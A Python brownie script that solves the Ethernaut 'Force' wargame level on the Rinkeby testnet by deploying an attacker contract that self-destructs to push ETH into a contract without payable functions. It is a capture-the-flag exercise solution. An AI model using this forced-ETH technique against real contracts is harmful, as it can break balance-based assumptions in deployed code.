from brownie import accounts, Force, ForceAttacker
from web3 import Web3

eth_amount = Web3.toWei("0.0001", "ether")

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x63BC81F4dAdB8b7c4df43CDd450d2743f9D48491"
force = Force.at(instance_address)

# ---------------------------------------------------
# To complete this level we must make the balance
# of the contract greater than 0
# ---------------------------------------------------


def level_completed():
    return force.balance() > 0


def exploit():
    # check the balance of force
    print(force.balance())

    # deploy hacker contract
    hacker = ForceAttacker.deploy({"from": account, "value": eth_amount})

    # selfdestruct and send force contract some eth
    tx = hacker.sendThemSomeEth(instance_address, {"from": account})
    tx.wait(1)

    # confirm we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
